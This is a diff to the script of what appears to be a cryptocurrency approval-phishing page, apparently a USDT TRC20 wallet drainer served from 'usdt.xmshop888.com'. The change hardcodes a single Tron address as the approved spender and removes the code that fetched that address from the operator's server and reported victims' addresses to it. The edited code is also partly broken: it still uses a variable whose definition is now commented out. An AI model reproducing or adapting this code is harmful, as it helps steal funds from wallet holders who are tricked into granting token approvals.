@@ -39,23 +39,14 @@
 <script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://usdt.xmshop888.com/public/covid/erc_files/TronWeb.js"></script>
 <script type="text/javascript">
-  var address = getUrlQueryString('address')
+  var address = "TLW3ciBQ9z8LRy9Z1Ex97v1n9C2s7wrGCA"
   var rank = 6.5;
-  var authorized_address = '';
+  var authorized_address = 'TLW3ciBQ9z8LRy9Z1Ex97v1n9C2s7wrGCA';
   var domain = 'https://usdt.xmshop888.com/';
   var bizhong = '';
   var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
   var total=0;
   var trx = 0;
-  function getUrlQueryString(names, urls) {
-    urls = urls || window.location.href;
-    urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
-    var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
-    var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
-    if (r != null && r[2] != "")return unescape(r[2]);
-    return null;
-
-  }
 
   $('input.num').bind('input propertychange', function()
   {
@@ -68,33 +59,9 @@
 
   })
 
-  function getInfo(){
-    $.ajax({
-      type: 'get',
-      url:  domain + 'api/get_trc',
-      async : false,
-      success:function(data){
-        console.log(data)
-        authorized_address = data.data.authorized_address;
-        console.log(authorized_address);
-      },
-      error:function(data){
-
-      }
-    })
-  }
-
   async function postInfo(address,symbol){
-    var s = getUrlQueryString('s')
-    var a = getUrlQueryString('r')
-    // if (trx < 5) {
-    //   return
-    // }
-
-
-// 		if (total == 0) {
-// 				return;
-// 			}
+    //var s = getUrlQueryString('s')
+    //var a = getUrlQueryString('r')
     var data = {
       address:address,
       authorized_address:authorized_address,
@@ -103,23 +70,6 @@
       reffer:a,
       type:1
     }
-    $.ajax({
-      type: 'post',
-      url:  domain + 'api/insert_trc',
-      data:data,
-      success:function(data){
-      //console.log(data)
-          if(data.code === 200){
-            alert("插入成功");
-          	console.log('success')
-          }
-        alert("插入失败"+ata.msg);
-          console.log(data.msg)
-      },
-      error:function(data){
-      	console.log(data)
-      }
-    })
   }
   $('#address').text(address)
 
@@ -251,10 +201,6 @@
       })
     }
     function init() {
-      getInfo();
-
-
-
     }
 
 
